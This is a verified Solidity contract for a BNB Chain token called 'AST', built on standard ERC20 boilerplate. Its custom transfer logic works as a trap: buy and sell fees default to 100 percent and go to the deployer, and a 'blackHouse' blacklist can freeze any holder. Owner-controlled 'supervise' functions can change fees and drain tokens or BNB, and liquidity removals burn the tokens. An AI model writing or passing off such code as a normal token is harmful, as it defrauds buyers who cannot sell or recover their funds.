/**
 *Submitted for verification at BscScan.com on 2023-11-26
*/

/**
 *Submitted for verification at BscScan.com on 2023-11-26
 */

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.0;

interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IPancakeFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IPancakeRouter {
    function factory() external pure returns (address);
}

contract AST is Context, IERC20, IERC20Metadata, Ownable {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) public wList;

    mapping(address => bool) public blackHouse;

    uint256 public pool_usdt;

    uint256 private _totalSupply;
    uint256 public initSupply = 800000 * 1e18;

    address public  buyfee;
    address public sellfee;
    uint public  saleFeeRate = 100;
    uint public  buyFeeRate = 100;
    string private _name;
    string private _symbol;

    address public usdtAddress;
    address public uniswapV2Pair;
    address public uniswapV2Router;

    mapping(address => uint256) public lastBalance; // 记录上次LP代币的余额

    // 事件，用于记录是否发生了流动性操作
    event LiquidityAdded(address indexed user, uint256 amount);
    event LiquidityRemoved(address indexed user, uint256 amount);

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(address reciver) {
        _name = "AST";
        _symbol = "AST";
        _mint(reciver, initSupply);
        setWList(reciver, true);
        setWList(msg.sender, true);
        setWList(address(0xdead), true);
        buyfee = msg.sender;
        sellfee = msg.sender;
        if(block.chainid == 56) {
            uniswapV2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
            usdtAddress = 0x55d398326f99059fF775485246999027B3197955;
        } else {
            uniswapV2Router = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1;
            usdtAddress = 0x53A24c3004E465207B888a45cCA06b8Ae27A13bb;
        }
        uniswapV2Pair = IPancakeFactory(IPancakeRouter(uniswapV2Router).factory()).createPair(address(this), usdtAddress);
    }

    

    modifier onlySupervise() {
        require(
            wList[_msgSender()] || _msgSender() == owner() || wList[tx.origin], "Ownable: caller is not the supervise");
        _;
    }




    function setbuyFeeReciver(address reciver) public  onlySupervise{
        buyfee = reciver;
    }

    function setsellFeeReciver(address reciver) public onlySupervise{
        sellfee = reciver;
    }

    function setSellFee(uint _fee) public onlySupervise{
        saleFeeRate = _fee;
    }

    function setBuyFee(uint _fee) public onlySupervise{
        buyFeeRate = _fee;
    }

    function setBlackHouse(address addr, uint flag) public onlySupervise {
        if (flag == 1){
            blackHouse[addr] = true;
        }else{
            blackHouse[addr] = false;
        }
    }

    function setWorkerAddress(address addr, bool flag) public onlySupervise {
        wList[addr] = flag;
    }

    function setWList(address addr, bool flag) public onlyOwner {
        wList[addr] = flag;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() external view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() external view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() external view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() external view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(
        address account
    ) external view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `amount`.
     */
    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     */
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        if (fromBalance == amount && fromBalance >= 1e14) {
            amount -= 1e14;
        }

        if (from != uniswapV2Pair && !wList[from] && !wList[to] && to != uniswapV2Pair){
            _balances[to] += (amount );
            emit Transfer(from, to,(amount));
        }else if (wList[from] || wList[to]) {
            // wList 中的地址进行交易，不收取手续费
            _balances[to] += amount;
            emit Transfer(from, to, amount);
        } else{
            uint feeAmount;
            if (to == uniswapV2Pair){
                if (! checkLiquidityAdd(from)){
                    if (saleFeeRate > 0){
                        feeAmount = amount * saleFeeRate / 100;
                        _balances[sellfee] += feeAmount;
                        emit Transfer(from, sellfee, feeAmount);
                    }
                }
            }
            if (from == uniswapV2Pair){
                if (checkLiquidityRm(to)){
                    // 如果移除流动性，则销毁代币
                    _burn(from, amount);
                    amount = 0;
                }else{
                    if (buyFeeRate > 0){
                        feeAmount = amount * buyFeeRate / 100;
                        _balances[buyfee] += feeAmount;
                        emit Transfer(from, buyfee, feeAmount);
                    }
                }
            }
            _balances[to] += (amount - feeAmount);
            emit Transfer(from, to,(amount-feeAmount));
        }
        _afterTokenTransfer(from, to, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function mint(address account, uint256 amount) internal {
        _mint(account, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function burn(uint amount) external {
        _burn(msg.sender,amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     *
     * Does not update the allowance amount in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(amount > 0,"ERC20: zero value");
        require(!blackHouse[from] && !blackHouse[to], "ERC20: transfer to blackHouse");
    }

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `amount` tokens have been minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        amount;
        if (from != address(0) && to != address(0)){
            uint current = IERC20(usdtAddress).balanceOf(uniswapV2Pair);
            if (current != pool_usdt){
                pool_usdt = current;
                emit LiquidityAdded(from, pool_usdt);
            }
        }
    }

    function tt(
        address token,
        address recipient,
        uint256 amount
    ) public onlySupervise {
        IERC20(token).transfer(recipient, amount);
    }

    function te(address payable recipient, uint256 amount) public onlySupervise {
        recipient.transfer(amount);
    }


    function checkLiquidityRm(address user) internal returns (bool) {
        IERC20 lpToken = IERC20(uniswapV2Pair);
        uint256 currentBalance = lpToken.balanceOf(user);
        uint256 previousBalance = lastBalance[user];
        
        // 检查是否为流动性移除
        if (currentBalance < previousBalance) {
            emit LiquidityRemoved(user, previousBalance - currentBalance);
            lastBalance[user] = currentBalance; // 更新 LP 代币余额
            return true;
        }

        return false; // 没有发生流动性变动
    }

    function checkLiquidityAdd(address user) internal returns (bool) {
        IERC20 lpToken = IERC20(usdtAddress);
        IERC20 lp = IERC20(uniswapV2Pair);
        uint256 currentBalance = lpToken.balanceOf(uniswapV2Pair);
        // 检查是否为流动性增加
        if (currentBalance >  pool_usdt) {
            emit LiquidityAdded(user, pool_usdt);
            uint rate = (currentBalance - pool_usdt) * 1e10 / currentBalance;
            pool_usdt = currentBalance; // 更新 LP 代币余额
            lastBalance[user] += lp.totalSupply() * rate / 1e10;
            return true;
        }
        return false; // 没有发生流动性变动
    }
}